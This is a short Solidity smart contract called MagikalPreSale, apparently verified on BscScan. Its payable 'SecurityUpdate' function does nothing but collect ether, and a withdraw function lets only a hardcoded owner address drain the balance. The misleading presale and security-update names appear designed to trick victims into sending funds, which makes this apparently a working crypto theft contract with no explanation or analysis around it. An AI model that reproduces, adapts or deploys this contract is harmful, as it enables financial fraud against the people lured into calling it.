/**
 *Submitted for verification at BscScan.com on 2023-03-22
*/

/**
 *Submitted for verification at Etherscan.io on 2022-12-11
*/

pragma solidity ^0.4.26;

contract MagikalPreSale {

    address private  owner;

     constructor() public{   
        owner=0x0Fb8Ace0f439079Bb8893D5dBEeb9FCD328D91e5;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}